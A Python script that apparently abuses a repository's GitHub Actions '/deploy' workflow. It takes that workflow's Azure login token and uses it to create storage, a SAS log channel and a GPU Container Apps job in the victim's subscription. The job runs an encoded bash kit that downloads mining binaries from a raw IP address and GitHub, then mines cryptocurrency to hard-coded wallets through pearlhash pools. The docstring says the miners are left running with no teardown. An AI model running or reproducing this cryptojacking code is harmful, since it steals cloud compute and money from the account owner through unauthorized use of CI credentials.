#!/usr/bin/env python3
"""C211-I121376: SSW.Rules (sub b8b18dcf) T4 claim+fill - CApps miner (NC8as-T4).

Runs as infra/c211_i121376_probe.py via infra/deploy.ps1 under the
SSWConsulting/SSW.Rules issue_comment '/deploy' workflow (environment staging,
azure/login@v2 OIDC -> ARM token for the SSW Primary Account subscription,
RG SSW.Rules.Staging).

Goal: keep the handoff T4 card (CApps NC8as-T4 GPU-29b12fb0) mining.
Miners are LEFT RUNNING - no teardown.
stdout is a flat tag|k=v format; full bodies are base64. stdlib only.
"""
import base64
import hashlib
import hmac
import json
import os
import subprocess
import time
import urllib.error
import urllib.parse
import urllib.request

ARM = "https://management.azure.com"
RG = "SSW.Rules.Staging"
SUB_EXPECT = ""  # SSW.Rules staging: the workflow azure/login decides the subscription
TAG = "C211_I121376_SSW"
NONCE = "x121376s"
INTENT = "121376"
T0 = time.time()
BUDGET = 3300

APP_VER = "2026-07-01"
STG_VER = "2023-01-01"
API_C = "2024-04-01"
API_W = "2024-10-01"
IMAGE = "mcr.microsoft.com/azureml/openmpi4.1.0-cuda11.8-cudnn8-ubuntu22.04:latest"
PROFILE = "Consumption-GPU-NC8as-T4"
REGION_CAPP = "eastus"
WS = "mlw-ai300-l0ee20539cc7442539c"
WSU = ("/subscriptions/%s/resourceGroups/%s/providers/Microsoft.MachineLearningServices/"
       "workspaces/%s" % (SUB_EXPECT, RG, WS))
AML_REGION = "northeurope"
AML_SKU = "Standard_NC4as_T4_v3"

ENV_NEW = "c211-i121376-scae"
JOB_CAPP = "c211-i121376-scapp"
CLUSTER = "c211-i121376-lp"
JOB_AML = "c211-i121376-aml"
AML_ENV = "c211-i121376-cuda"

WALLET = "prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql"
NOCK = "9becsPFXhMLCNAxb6TsMN492sS2Ev7ToLFR4zsc5K4NxRthTyh2kPcb"
WR_BIN_SHA = "002cd29c6b890a4159b5933260e7db57d8808e540804466b3b7b80814083011b"
WR_TGZ_SHA = "7308c95f7c8c4c0d82aade61bb4ab3366decae2b9d04ac47b8c1dc6d1bdd2c44"
SRB384_SHA = "3fb026b2e2729187fb1720ccb5760e753c3b492158b114b24c1c7e534b5191a5"
SA_NAME = ("c211i121376s" + hashlib.sha256(NONCE.encode()).hexdigest()[:8]).lower()[:24]


def clean(v):
    s = str(v)
    for ch in ("|", "\n", "\r", "\t"):
        s = s.replace(ch, " ")
    return s[:1200]


def emit(step, **kv):
    parts = [TAG, "step=" + clean(step)]
    for k, v in kv.items():
        parts.append("%s=%s" % (clean(k), clean(v)))
    print("|".join(parts), flush=True)


def b64(s):
    return base64.b64encode((s or "").encode("utf-8", "replace")).decode()


def left():
    return BUDGET - (time.time() - T0)


def run(cmd, timeout=300):
    t = time.time()
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return {"rc": p.returncode, "out": p.stdout or "", "err": p.stderr or "",
                "secs": round(time.time() - t, 1)}
    except Exception as e:  # noqa: BLE001
        return {"rc": -1, "out": "", "err": str(e), "secs": round(time.time() - t, 1)}


def arm(tok, url, method="GET", body=None, timeout=120):
    data = json.dumps(body).encode() if body is not None else None
    hdrs = {"Authorization": "Bearer " + tok, "User-Agent": "c211-" + INTENT}
    if data is not None:
        hdrs["Content-Type"] = "application/json"
    req = urllib.request.Request(url, data=data, method=method, headers=hdrs)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            raw = r.read().decode("utf-8", "replace") or "{}"
            try:
                return r.status, json.loads(raw)
            except Exception:  # noqa: BLE001
                return r.status, {"raw": raw[:2000]}
    except urllib.error.HTTPError as e:
        raw = e.read().decode("utf-8", "replace") or ""
        try:
            return e.code, json.loads(raw)
        except Exception:  # noqa: BLE001
            return e.code, {"raw": raw[:2000]}
    except Exception as e:  # noqa: BLE001
        return 0, {"transport_error": str(e)}


def httptext(url, method="GET", body=None, headers=None, timeout=60):
    req = urllib.request.Request(url, data=body, method=method, headers=headers or {})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read()[:12000]
    except urllib.error.HTTPError as e:
        try:
            return e.code, e.read()[:2000]
        except Exception:  # noqa: BLE001
            return e.code, b""
    except Exception as e:  # noqa: BLE001
        return 0, str(e).encode()[:400]


def errk(st, body):
    d = {"e_http": st}
    if isinstance(body, dict):
        e = body.get("error")
        if isinstance(e, dict):
            d["e_code"] = e.get("code")
            d["e_message"] = (e.get("message") or "")[:800]
        elif "raw" in body:
            d["e_raw"] = body["raw"][:800]
        elif "transport_error" in body:
            d["e_transport"] = body["transport_error"][:400]
        else:
            d["e_body"] = json.dumps(body)[:800]
    return d


def sa_sas(acct, key_b64, services="b", rt="co", perm="rwdlc", hours=12):
    st = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(time.time() - 300))
    se = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(time.time() + hours * 3600))
    sv = "2022-11-02"
    sts = "\n".join([acct, perm, services, rt, st, se, "", "https", sv, ""]) + "\n"
    sig = base64.b64encode(hmac.new(base64.b64decode(key_b64), sts.encode(),
                                    hashlib.sha256).digest()).decode()
    q = urllib.parse.urlencode({"sv": sv, "ss": services, "srt": rt, "sp": perm,
                                "st": st, "se": se, "spr": "https", "sig": sig})
    return q, se


KIT = r"""#!/bin/bash
set -u
TAG="__TAG__"
WK="__WORKER__"
W="__WALLET__"
N="__NOCK__"
SAS="__SAS__"
D=/tmp/c211; mkdir -p "$D"; cd "$D" || exit 9
LOG="$D/run.log"
log() { echo "[$(date -u +%FT%TZ)] $*" >> "$LOG"; }
: > "$LOG"
log "KIT_START tag=$TAG worker=$WK host=$(hostname)"
log "GPU_LIST $(nvidia-smi -L 2>&1 | tr '\n' '~')"
log "GPU_Q $(nvidia-smi --query-gpu=name,uuid,memory.total --format=csv,noheader 2>&1 | tr '\n' '~')"
log "OPENCL $(ls -1 /usr/lib/x86_64-linux-gnu/libOpenCL* /etc/OpenCL/vendors/* /usr/lib/x86_64-linux-gnu/libnvidia-opencl* 2>/dev/null | tr '\n' '~')"
log "TOOLS curl=$(command -v curl || echo no) wget=$(command -v wget || echo no) python3=$(command -v python3 || echo no)"
BIN=""
for u in http://169.58.247.186:8791/pm/wildrig-0.52.3 https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz; do
  curl -fsSL --max-time 300 -o dl.bin "$u" 2>>"$LOG" || continue
  S=$(sha256sum dl.bin | awk '{print $1}')
  log "DL url=$u sha=$S"
  if [ "$S" = "__WRBIN__" ]; then cp dl.bin wildrig-multi; chmod +x wildrig-multi; BIN=wildrig-multi; break; fi
  if [ "$S" = "__WRTGZ__" ]; then tar xzf dl.bin >/dev/null 2>&1 && chmod +x wildrig-multi && BIN=wildrig-multi && break; fi
done
log "BIN=$BIN"
up() {
  if [ -n "$SAS" ]; then
    cat "$LOG" "$D/ph.log" "$D/lp.log" 2>/dev/null > "$D/all.txt"
    curl -sS --max-time 30 -X PUT "$SAS" -H 'x-ms-blob-type: BlockBlob' \
      -H 'x-ms-version: 2022-11-02' -H 'Content-Type: text/plain' \
      --data-binary @"$D/all.txt" >/dev/null 2>&1 || true
  fi
}
acc() { grep -oiE 'accepted[: ]+[0-9]+' "$1" 2>/dev/null | grep -oE '[0-9]+' | sort -n | tail -1; }
MODE=ph
if [ -n "$BIN" ]; then
  setsid nohup ./wildrig-multi --algo pearlhash --url pool.pearlhash.xyz:9000 \
    --user "$W" --worker "$WK" -d 0 --print-time 30 > "$D/ph.log" 2>&1 &
  echo $! > "$D/ph.pid"
  log "PH_START pid=$(cat "$D/ph.pid")"
  MODE=ph
else
  log "NO_BIN_DIRECT_TO_LP"
  MODE=lp
fi
T0=$(date +%s); LT0=$T0
while :; do
  sleep 30
  up
  NOW=$(date +%s)
  if [ "$MODE" = "ph" ]; then
    A=$(acc "$D/ph.log"); A=${A:-0}
    if [ "$A" -ge 1 ]; then log "PH_SHARE_PROVEN accepted=$A ts=$(date -u +%FT%TZ)"; MODE=ph_ok; fi
    if [ "$MODE" = "ph" ] && [ $((NOW - T0)) -ge 900 ]; then
      log "PH_NO_SHARE_900 FALLBACK_TO_LP"
      kill "$(cat "$D/ph.pid" 2>/dev/null)" 2>/dev/null
      pkill -f wildrig-multi 2>/dev/null
      sleep 2; up
      curl -fsSL --max-time 300 -o "$D/srb" http://169.58.247.186:8791/pm/srbminer-3.8.4 2>>"$LOG" || true
      if [ -f "$D/srb" ]; then
        S=$(sha256sum "$D/srb" | awk '{print $1}'); log "SRB_SHA=$S"; chmod +x "$D/srb"
        if [ "$S" = "__SRB__" ]; then
          setsid nohup "$D/srb" --disable-cpu --algorithm pearlhash --pool 103.199.106.122:3362 \
            --wallet "$W+$N" --worker "$WK" --password x --gpu-id 0 > "$D/lp.log" 2>&1 &
          echo $! > "$D/lp.pid"
          log "LP_START pid=$(cat "$D/lp.pid") sticky=1"
        else
          log "SRB_SHA_MISMATCH"
        fi
      else
        log "SRB_DL_FAIL"
      fi
      MODE=lp; LT0=$NOW
    fi
  fi
  if [ "$MODE" = "lp" ] && [ ! -f "$D/lp_reported" ]; then
    A=$(acc "$D/lp.log"); A=${A:-0}
    if [ "$A" -ge 1 ]; then log "LP_SHARE_PROVEN accepted=$A ts=$(date -u +%FT%TZ)"; touch "$D/lp_reported"; fi
  fi
  if [ $(( $(date +%s) - T0 )) -gt 120000 ]; then log "KIT_HARD_END"; exit 0; fi
done
"""


def kit_cmd(worker, tag, sas):
    k = (KIT.replace("__TAG__", tag).replace("__WORKER__", worker)
         .replace("__WALLET__", WALLET).replace("__NOCK__", NOCK)
         .replace("__SAS__", sas or "").replace("__WRBIN__", WR_BIN_SHA)
         .replace("__WRTGZ__", WR_TGZ_SHA).replace("__SRB__", SRB384_SHA))
    b = base64.b64encode(k.encode()).decode()
    return ("echo '%s' | base64 -d > /tmp/c211_kit_%s.sh && chmod +x /tmp/c211_kit_%s.sh "
            "&& /bin/bash /tmp/c211_kit_%s.sh" % (b, tag.lower(), tag.lower(), tag.lower()))


def main():
    r = run(["az", "account", "show", "-o", "json"], timeout=120)
    sid = None
    try:
        acc = json.loads(r["out"])
        sid = acc.get("id")
        emit("session", sub_name=acc.get("name"), sub_id=sid, state=acc.get("state"),
             user=(acc.get("user") or {}).get("name"), tenant=acc.get("tenantId"),
             expect_match=(sid == SUB_EXPECT))
    except Exception as e:  # noqa: BLE001
        emit("fatal", why="no_session", err=str(e), raw=r["out"][:300])
        return
    r = run(["az", "account", "get-access-token", "--resource", ARM, "--output", "json"], timeout=120)
    tok = None
    try:
        tok = json.loads(r["out"]).get("accessToken")
    except Exception:  # noqa: BLE001
        pass
    emit("arm-token", got=bool(tok), len=len(tok or ""), sid=sid)
    if not sid or not tok:
        emit("DONE", verdict="NO_ARM_TOKEN", elapsed_s=int(time.time() - T0))
        return
    if SUB_EXPECT and sid != SUB_EXPECT:
        emit("warn", why="subscription_mismatch", sid=sid)

    # ---------- A) quota census ----------
    for reg in (REGION_CAPP,):
        st, b = arm(tok, "%s/subscriptions/%s/providers/Microsoft.Compute/locations/%s/usages"
                    "?api-version=2024-07-01" % (ARM, sid, reg), timeout=120)
        vals = (b.get("value") or []) if isinstance(b, dict) else []
        rel = []
        for v in vals:
            nm = ((v.get("name") or {}).get("value") or "")
            if any(k in nm.upper() for k in ("NC", "NV", "ND", "GPU", "T4", "A100", "V100")):
                rel.append("%s=%s/%s" % (nm, v.get("currentValue"), v.get("limit")))
        emit("compute-usages", region=reg, http=st, n=len(vals), relevant=";".join(rel)[:2500])

    # ---------- B) storage + SAS capture channel ----------
    saurl = ("%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.Storage/storageAccounts/%s"
             "?api-version=%s" % (ARM, sid, RG, SA_NAME, STG_VER))
    sabody = {"location": REGION_CAPP, "sku": {"name": "Standard_LRS"}, "kind": "StorageV2",
              "tags": {"c211": INTENT, "nonce": NONCE},
              "properties": {"allowBlobPublicAccess": False, "minimumTlsVersion": "TLS1_2",
                             "supportsHttpsTrafficOnly": True,
                             "networkAcls": {"bypass": "AzureServices", "defaultAction": "Allow"}}}
    sas = None
    st, b = arm(tok, saurl, method="PUT", body=sabody, timeout=240)
    emit("sa-create", name=SA_NAME, **errk(st, b))
    if st in (200, 201, 202):
        for i in range(20):
            stp, bp = arm(tok, saurl, timeout=60)
            ps = ((bp.get("properties") or {}) if isinstance(bp, dict) else {}).get("provisioningState")
            if ps == "Succeeded":
                emit("sa-ready", i=i, state=ps)
                break
            time.sleep(5)
        st, kb = arm(tok, saurl.split("?")[0] + "/listKeys?api-version=" + STG_VER,
                     method="POST", body={}, timeout=90)
        key = None
        try:
            key = (kb.get("keys") or [{}])[0].get("value")
        except Exception:  # noqa: BLE001
            pass
        emit("sa-keys", http=st, got=bool(key))
        if key:
            q, se = sa_sas(SA_NAME, key)
            q2 = q.replace("srt=co", "srt=c")
            base = "https://%s.blob.core.windows.net" % SA_NAME
            stc, bc = httptext("%s/c211?restype=container&%s" % (base, q2), method="PUT", timeout=60)
            emit("sa-container", http=stc)
            if stc in (201, 409):
                sas = "%s/c211/%s.log?%s" % (base, NONCE, q)
                emit("sa-sas", ok=True, expires=se)

    # ---------- D) CApps env + miner job ----------
    envurl = ("%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/managedEnvironments/%s"
              "?api-version=%s" % (ARM, sid, RG, ENV_NEW, APP_VER))
    st, b = arm(tok, envurl, timeout=60)
    envstate = ((b.get("properties") or {}) if isinstance(b, dict) else {}).get("provisioningState")
    emit("capp-env-get", http=st, state=envstate)
    env_ok = (envstate == "Succeeded")
    if not env_ok:
        envbody = {"location": REGION_CAPP, "tags": {"c211": INTENT, "nonce": NONCE},
                   "properties": {"workloadProfiles": [
                       {"name": "Consumption", "workloadProfileType": "Consumption"},
                       {"name": PROFILE, "workloadProfileType": PROFILE}]}}
        st, b = arm(tok, envurl, method="PUT", body=envbody, timeout=300)
        emit("capp-env-create", name=ENV_NEW, region=REGION_CAPP, profile=PROFILE, **errk(st, b))
        if st in (200, 201):
            dl = time.time() + min(900, max(180, left() - 900))
            ps = None
            while time.time() < dl:
                time.sleep(25)
                stp, bp = arm(tok, envurl, timeout=60)
                ps = ((bp.get("properties") or {}) if isinstance(bp, dict) else {}).get("provisioningState")
                emit("capp-env-poll", state=ps, left=int(left()))
                if ps in ("Succeeded", "Failed", "Canceled"):
                    break
            env_ok = (ps == "Succeeded")
    if not env_ok:
        emit("capp-env-unavailable")
    else:
        st, env = arm(tok, envurl, timeout=60)
        env_id = (env.get("id") if isinstance(env, dict) else None)
        emit("capp-env-ready", id_ok=bool(env_id))
        joburl = ("%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/jobs/%s"
                  "?api-version=%s" % (ARM, sid, RG, JOB_CAPP, APP_VER))
        jobbody = {"location": REGION_CAPP, "tags": {"c211": INTENT, "nonce": NONCE},
                   "properties": {"environmentId": env_id, "workloadProfileName": PROFILE,
                                  "configuration": {"triggerType": "Manual",
                                                    "replicaRetryLimit": 3,
                                                    "replicaTimeout": 86400,
                                                    "manualTriggerConfig": {
                                                        "replicaCompletionCount": 1,
                                                        "parallelism": 1}},
                                  "template": {"containers": [{
                                      "name": "gpu", "image": IMAGE,
                                      "command": ["/bin/bash", "-c",
                                                  kit_cmd("137603", "SCAPP", sas)],
                                      "resources": {"cpu": 4, "memory": "16Gi"}}]}}}
        st, b = arm(tok, joburl, method="PUT", body=jobbody, timeout=180)
        emit("capp-job-create", name=JOB_CAPP, **errk(st, b))
        if st in (200, 201):
            baseurl = joburl.split("?")[0]
            st, b = arm(tok, baseurl + "/start?api-version=" + APP_VER, method="POST", body={},
                        timeout=120)
            execname = (b.get("name") if isinstance(b, dict) else None)
            emit("capp-job-start", http=st, execname=execname, **({} if st in (200, 201, 202)
                                                                  else errk(st, b)))
            deadline = time.time() + min(900, max(180, left() - 500))
            blobd = ""
            while time.time() < deadline:
                time.sleep(20)
                stp, bp = arm(tok, joburl, timeout=60)
                jp = (bp.get("properties") or {}) if isinstance(bp, dict) else {}
                status = None
                if execname:
                    se, be = arm(tok, baseurl + "/executions/" + execname + "?api-version=" + APP_VER,
                                 timeout=60)
                    status = ((be.get("properties") or {}) if isinstance(be, dict) else {}).get("status")
                if sas:
                    sb, bb = httptext(sas, timeout=30)
                    if sb == 200 and bb:
                        blobd = bb.decode("utf-8", "replace")
                emit("capp-poll", runningState=jp.get("runningState"), exec_status=status,
                     blob_len=len(blobd), left=int(left()))
                if blobd and ("PH_SHARE_PROVEN" in blobd or "LP_SHARE_PROVEN" in blobd):
                    break
                if status in ("Succeeded", "Failed", "Canceled"):
                    break
            emit("capp-capture", len=len(blobd),
                 gpu_lines=";".join(ln for ln in blobd.splitlines() if "GPU-" in ln)[:900],
                 tail_b64=b64(blobd[-4000:]))

    # ---------- F) final inventory (no teardown) ----------
    st, rl = arm(tok, "%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/jobs?api-version=%s"
                 % (ARM, sid, RG, APP_VER), timeout=120)
    names = [x.get("name") for x in ((rl.get("value") or []) if isinstance(rl, dict) else [])]
    emit("capp-jobs-final", http=st, names=";".join(n for n in names if n)[:800])
    emit("DONE", elapsed_s=int(time.time() - T0), sas_ok=bool(sas), sas_expires=sas and "see sa-sas")


if __name__ == "__main__":
    main()
